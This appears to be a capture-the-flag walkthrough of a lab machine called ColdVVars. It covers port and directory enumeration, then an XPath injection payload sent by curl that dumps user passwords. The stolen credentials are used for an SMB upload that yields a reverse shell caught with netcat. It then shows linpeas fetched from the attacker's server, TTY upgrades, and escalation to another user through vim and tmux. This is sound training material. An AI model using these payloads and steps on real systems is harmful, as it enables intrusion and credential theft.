

<br>

<h3>nmap</h3>

```bash
:~/ColdVVars# nmap -sC -sV TargetIP
...
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
8080/tcp open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8082/tcp open  http        Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
...
Host script results:
|_clock-skew: -1s
|_nbstat: NetBIOS name: , NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-08-11T17:41:08
|_  start_date: N/A
```

<br>

```bash
:~/ColdVVars# nmap -sC -sV -A -p22,445,8080,8082 -T4 10.201.23.173
...
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
445/tcp  open  netbios-ssn Samba smbd 4.6.2
8080/tcp open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8082/tcp open  http        Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
MAC Address: 16:FF:C5:FA:27:DD (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.10 - 3.13 (94%), Linux 3.8 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: -1s
|_nbstat: NetBIOS name: , NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-08-11T17:40:11
|_  start_date: N/A
```

<br>
<h3>/etc/hosts</h3>

```bash
xx.xxx.xx.xxx    coldvvars.thm
```

<br>

<h3>dirb</h3>
<h4>8080</h4>

```bash
:~/ColdVVars# dirb http://coldvvars.thm:8080
...
---- Scanning URL: http://coldvvars.thm:8080/ ----
==> DIRECTORY: http://coldvvars.thm:8080/dev/                                                                  
+ http://coldvvars.thm:8080/index.html (CODE:200|SIZE:10918)                                                   
+ http://coldvvars.thm:8080/index.php (CODE:200|SIZE:4)                                                        
+ http://coldvvars.thm:8080/server-status (CODE:403|SIZE:280)                                                  
                                                                                                               
---- Entering directory: http://coldvvars.thm:8080/dev/ ----
```

<h4>8082</h4>

```bash
:~/ColdVVars# dirb http://coldvvars.thm:8082
...                                                    
---- Scanning URL: http://coldvvar.thm:8082/ ----
+ http://coldvvar.thm:8082/login (CODE:200|SIZE:1605)                                                          
+ http://coldvvar.thm:8082/Login (CODE:200|SIZE:1605)                                                          
+ http://coldvvar.thm:8082/static (CODE:301|SIZE:179)
```

<br>
<h3>gobuster</h3>

```bash
:~/ColdVVars# gobuster dir -u http://coldvvars.thm:8080/dev/ -w /usr/share/dirb/wordlists/common.txt -x txt,bak,old,html -t 60
...
/note.txt             (Status: 200) [Size: 45]
```

<br>
<h3>smbclient</h3>

```bash
:~/ColdVVars# smbclient -L coldvvars.thm -N

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	SECURED         Disk      Dev
	IPC$            IPC       IPC Service (ip-xx-xxx-xx-xxx server (Samba, Ubuntu))
```

<img width="1236" height="169" alt="image" src="https://github.com/user-attachments/assets/b826c0a3-dfdc-4c06-9953-e30d86c004ba" />

<br>
<h3>Web - coldvvars.thm:8080 and coldvvars.thm:8080/index.html</h3>

<img width="1259" height="285" alt="image" src="https://github.com/user-attachments/assets/93e6d100-21bf-4b94-b29b-87fa791269e2" />

<br>
<h3>Web - coldvvars.thm:8080/index.php</h3>

<img width="1265" height="181" alt="image" src="https://github.com/user-attachments/assets/45087b9d-3498-464e-93a2-53d9cb290681" />

<br>
<h3>Web - coldvvars.thm:8080/dev/</h3>

<img width="1256" height="220" alt="image" src="https://github.com/user-attachments/assets/4924d95a-a3b1-48a7-95be-e611dae9091b" />


<br>
<h3>Web - coldvvars.thm:8080/dev/note.txt</h3>
<p>

  - Secure File Upload and Testing Functionality</p>

<img width="1253" height="174" alt="image" src="https://github.com/user-attachments/assets/6cd71b76-f6cd-483f-8a8e-fb8ff2d6ca0f" />

<br>
<h3>Web - coldvvars.thm:8082</h3>

<img width="1254" height="596" alt="image" src="https://github.com/user-attachments/assets/bf008d93-e353-4a4b-93d1-bb1e4cc08950" />

<br>
<h3>Web - coldvvars.thm:8082/login</h3>

<img width="1066" height="561" alt="image" src="https://github.com/user-attachments/assets/ec32beac-3efc-4df7-8916-73d66105f9dd" />

<br>
<h3><code>' OR 1=1</code></h3>
<p

- <code>' OR 1=1</code> = <code>Username or Password Wrong</code><br>
- POST ... <code>username=%27+or+1%3D1&password=&submit=Login</code><br>
- 200 OK ... <code>X-Powered-By</code>: <code>Express</code> ... ETag</p>

<img width="1260" height="333" alt="image" src="https://github.com/user-attachments/assets/516ff623-8e4b-4f4a-bafc-f9a7c5ed7401" />

<br>

<img width="955" height="244" alt="image" src="https://github.com/user-attachments/assets/015d22e3-eece-4496-9ccd-97a0683a33fb" />

<br>
<h3><code>' OR 1=1</code> : <code>password</code></h3>
<p

- <code>' OR 1=1</code> and password--> <code>Username or Password Wrong</code><br>
- POST ... <code>username=%27+or+1%3D1&password=password&submit=Login</code><br>
- 200 OK ... X-Powered-By: Express ... ETag</p>

<br>

<img width="1255" height="370" alt="image" src="https://github.com/user-attachments/assets/cd212a65-5229-41d8-8793-54a7bbc6a131" />

<br>

<p>It´s vulnerable to <code>XPath Injection.</code></p>

<br>

```bash
:~/ColdVVars# nxc smb coldvvars.thm -u guest -p ''
```

<br>

<img width="1131" height="93" alt="image" src="https://github.com/user-attachments/assets/8ff283e7-165c-45ef-84f6-386eccb977e5" />

<br>
<br>
<h3><code>admin"or 1=1 or ""="</code></h3>

```bash
Username Password
Tove Jani
Godzilla KONGistheKING
SuperMan snyderCut
ArthurMorgan DeadEye
```

<img width="1276" height="277" alt="image" src="https://github.com/user-attachments/assets/cee1ce23-f489-4ea9-b0fe-6b69115dc9b9" />

<br>

<img width="1270" height="401" alt="image" src="https://github.com/user-attachments/assets/1510253e-a411-4279-af0c-f0be8c57e1a6" />

<br>
<br>
<h3>for the same purpose ...</h3>

```bash
POST /login HTTP/1.1
...
username=admin%22or+1%3D1+or+%22%22%3D%22&password=&submit=Login
```

<br>

```bash
# curl -X POST -d 'username=admin%22or+1%3D1+or+%22%22%3D%22&password=&submit=Login' 'http://coldvvars.thm:8082/Login'
Username Password<br>Tove             Jani<br>Godzilla             KONGistheKING<br>SuperMan             snyderCut<br>ArthurMorgan             DeadEye<br>
```

<img width="1744" height="132" alt="image" src="https://github.com/user-attachments/assets/9bc55124-f0f7-495b-901c-d7b7951fde56" />

<br>

<p>OR ...</p>

<br>
<img width="1282" height="70" alt="image" src="https://github.com/user-attachments/assets/47a696af-d369-48d0-93e8-26627613a445" />

```bash
:~/ColdVVars# nxc smb coldvvars.thm -u 'ArthurMorgan' -p 'DeadEye' --continue-on-success
SMB         xx.xxx.xx.xxx   445    IP-xx-xxx-xx-xxx [*] Unix - Samba (name:IP-xx-xxx-xx-xxx) (domain:ec2.internal) (signing:False) (SMBv1:False) 
SMB         xx.xxx.xx.xxx   445    IP-xx-xx-xx-xxx [+] ec2.internal\ArthurMorgan:DeadEye 
```

<img width="1278" height="152" alt="image" src="https://github.com/user-attachments/assets/85516a66-552a-4d25-b5f2-06d1c2737c8b" />

<br>
<h3>Reverse Shell</h3>

```bash
:~/ColdVVars# smbclient //coldvvars.thm/SECURED -U ArthurMorgan
Password for [WORKGROUP\ArthurMorgan]:
Try "help" to get a list of possible commands.
smb: \> put rev.txt
putting file rev.txt as \rev.txt (1788.7 kb/s) (average 1788.7 kb/s)
smb: \>
```

<br>

```bash
http://coldvvars.thm:8080/dev/rev.txt
```
<br>

```bash
:~/ColdVVars# nc -nlvp 9001
...
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
marston  pts/0    tmux(925).%0     17:31    1:14m  0.05s  0.05s -bash
marston  pts/1    tmux(925).%1     17:31    1:14m  0.05s  0.05s -bash
marston  pts/2    tmux(925).%2     17:31    1:14m  0.05s  0.05s -bash
marston  pts/3    tmux(925).%3     17:31    1:14m  0.05s  0.05s -bash
marston  pts/4    tmux(925).%4     17:31    1:14m  0.04s  0.04s -bash
marston  pts/5    tmux(925).%5     17:31    1:14m  0.05s  0.05s -bash
marston  pts/6    tmux(925).%6     17:31    1:14m  0.04s  0.04s -bash
marston  pts/7    tmux(925).%7     17:31    1:14m  0.05s  0.05s -bash
marston  pts/8    tmux(925).%8     17:31    1:14m  0.04s  0.04s -bash
marston  pts/9    tmux(925).%9     17:31    1:14m  0.05s  0.05s -bash
marston  pts/10   tmux(925).%10    17:31    1:14m  0.05s  0.05s -bash
marston  pts/11   tmux(925).%11    17:31    1:14m  0.05s  0.05s -bash
marston  pts/12   tmux(925).%12    17:31    1:14m  0.05s  0.05s -bash
marston  pts/13   tmux(925).%13    17:31    1:14m  0.05s  0.05s -bash
marston  pts/14   tmux(925).%14    17:31    1:14m  0.05s  0.05s -bash
marston  pts/15   tmux(925).%15    17:31    1:14m  0.04s  0.04s -bash
marston  pts/16   tmux(925).%16    17:31    1:14m  0.04s  0.04s -bash
marston  pts/18   tmux(925).%17    17:31    1:14m  0.05s  0.05s -bash
marston  pts/19   tmux(925).%18    17:31    1:14m  0.05s  0.05s -bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@ip-10-201-23-173:/$ ^Z
[1]+  Stopped                 nc -nlvp 9001
:~/ColdVVars# stty -echo raw;fg
nc -nlvp 9001

www-data@ip-xx-xxx-xx-xxx:/$ export TERM=xterm
www-data@ip-xx-xxx-xx-xxx:/$ cd /home
www-data@ip-xx-xxx-xx-xxx:/home$ ls
ArthurMorgan  marston  ssm-user  ubuntu
```


```bash
www-data@ip-xx-xxx-xx-xxx:/home$ su ArthurMorgan
Password: 
$ whoami
ArthurMorgan
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
ArthurMorgan@ip-xx-xxx-xx-xxx:/home$ export TERM=xterm
ArthurMorgan@ip-10-201-23-173:/home$ ls
ArthurMorgan  marston  ssm-user  ubuntu
ArthurMorgan@ip-xx-xxx-xx-xxx:/home$ cd ArthurMorgan
ArthurMorgan@ip-xx-xxx-xx-xxx:~$ ls
ideas  user.txt
ArthurMorgan@ip-xx-xxx-xx-xxx:~$ cat user.txt
ae39f419ce0a3a26f15db5aaa7e446ff
```

```bash
ArthurMorgan@ip-xx-xxx-xx-xxx:~$ sudo -l
[sudo] password for ArthurMorgan: 
Sorry, user ArthurMorgan may not run sudo on ip-xx-xxx-xx-xxx.
```

```bash
ArthurMorgan@iip-xx-xxx-xx-xxx:~$ find / -perm -4000 -user root -type f 2>/dev/null
/snap/snapd/23771/usr/lib/snapd/snap-confine
/snap/snapd/24718/usr/lib/snapd/snap-confine
/snap/core20/2599/usr/bin/chfn
/snap/core20/2599/usr/bin/chsh
/snap/core20/2599/usr/bin/gpasswd
/snap/core20/2599/usr/bin/mount
/snap/core20/2599/usr/bin/newgrp
/snap/core20/2599/usr/bin/passwd
/snap/core20/2599/usr/bin/su
/snap/core20/2599/usr/bin/sudo
/snap/core20/2599/usr/bin/umount
/snap/core20/2599/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2599/usr/lib/openssh/ssh-keysign
/snap/core20/2501/usr/bin/chfn
/snap/core20/2501/usr/bin/chsh
/snap/core20/2501/usr/bin/gpasswd
/snap/core20/2501/usr/bin/mount
/snap/core20/2501/usr/bin/newgrp
/snap/core20/2501/usr/bin/passwd
/snap/core20/2501/usr/bin/su
/snap/core20/2501/usr/bin/sudo
/snap/core20/2501/usr/bin/umount
/snap/core20/2501/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2501/usr/lib/openssh/ssh-keysign
/bin/su
/bin/fusermount
/bin/umount
/bin/mount
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/sbin/mount.cifs
```

```bash
ArthurMorgan@ip-xx-xxx-xx-xxx:~$ getent hosts
127.0.0.1       localhost
127.0.1.1       incognito
127.0.0.1       ip6-localhost ip6-loopback
```


```bash
ArthurMorgan@ip-xx-xxx-xx-xxx:~$ netstat -tunlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:8082            0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::445                  :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::139                  :::*                    LISTEN      -                   
tcp6       0      0 :::8080                 :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 10.201.23.173:68        0.0.0.0:*                           -                   
udp        0      0 10.201.127.255:137      0.0.0.0:*                           -                   
udp        0      0 10.201.23.173:137       0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:137             0.0.0.0:*                           -                   
udp        0      0 10.201.127.255:138      0.0.0.0:*                           -                   
udp        0      0 10.201.23.173:138       0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:138             0.0.0.0:*                           -       
```


```bash
ArthurMorgan@ip-xx-xxx-xx-xxx:~$ getent hosts
127.0.0.1       localhost
127.0.1.1       incognito
127.0.0.1       ip6-localhost ip6-loopback
```

```bash
:~/ColdVVars# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```


```bash
ArthurMorgan@ip-xx-xxx-xx-xxx:/dev/shm$ wget http://xx.xxx.xx.xxx:8000/linpeas.sh
...
ArthurMorgan@ip-xx-xxx-xx-xxx:/dev/shm$ chmod +x linpeas.sh
ArthurMorgan@ip-xx-xxx-xx-xxx: ./linpeas.sh -a
```

<br>

<img width="1261" height="751" alt="image" src="https://github.com/user-attachments/assets/8ac98e34-0b76-441d-93c0-4ae917d490c4" />

<br>

<img width="1269" height="130" alt="image" src="https://github.com/user-attachments/assets/2b89321b-91c2-4051-bf4e-150b35a74507" />

<br>

```bash
ArthurMorgan@ip-xx-xxx-xx-xxx:/dev/shm$ nc -nlvp 4545
```

<img width="1263" height="183" alt="image" src="https://github.com/user-attachments/assets/065658b1-e97d-41eb-a908-13c89bfbc4bf" />

<br>


```bash
ArthurMorgan@ip-xx-xxx-xx-xxx:/dev/shm$ nc -nlvp 4545
```

<p>

- chose <code>4</code></p>


<img width="1297" height="428" alt="image" src="https://github.com/user-attachments/assets/b26814e6-7ee1-4a64-b011-696a529bafb9" />


```bash
:!/bin/bash
:!/bin/bash
python -c 'import pty; pty.spawn("/bin/bash")'
marston@ip-xx-xxx-xx-xxx:~$ whoami
marston
marston@ip-xx-xxx-xx-xxx:~$ ls -lah
ls -lah
total 56K
drwxr-xr-x 8 marston marston 4.0K Aug 11 19:15 .
drwxr-xr-x 6 root    root    4.0K Aug 11 17:31 ..
drwxr-xr-x 5 marston marston 4.0K Mar 22  2021 app
lrwxrwxrwx 1 root    root       9 Mar 23  2021 .bash_history -> /dev/null
-rw-r--r-- 1 marston marston 3.7K Apr  4  2018 .bashrc
drwx------ 2 marston marston 4.0K Mar 22  2021 .cache
drwxr-x--- 3 marston marston 4.0K Mar 21  2021 .config
drwx------ 3 marston marston 4.0K Mar 22  2021 .gnupg
-rw------- 1 marston root    2.5K May 29  2021 hicckup.py
-rw-r--r-- 1 root    root       6 Mar 23  2021 ideas
drwxrwxr-x 3 marston marston 4.0K Mar 11  2021 .local
-rw-r--r-- 1 marston marston  807 Apr  4  2018 .profile
-rwxr-x--- 1 marston root     194 Mar 11  2021 run.sh
drwx------ 2 marston marston 4.0K Mar 23  2021 .ssh
-rw------- 1 marston marston  978 Aug 11 19:15 .viminfo
```


```bash
marston@ip-xx-xxx-xx-xxx:~$ export TERM=xterm-256color
```

```bash
marston@ip-xx-xxx-xx-xxx:~$ tmux ls
0: 9 windows (created Mon Aug 11 17:31:09 2025)
```


```bash
marston@ip-xx-xxx-xx-xxx:~$ tmux attach -t 0
```




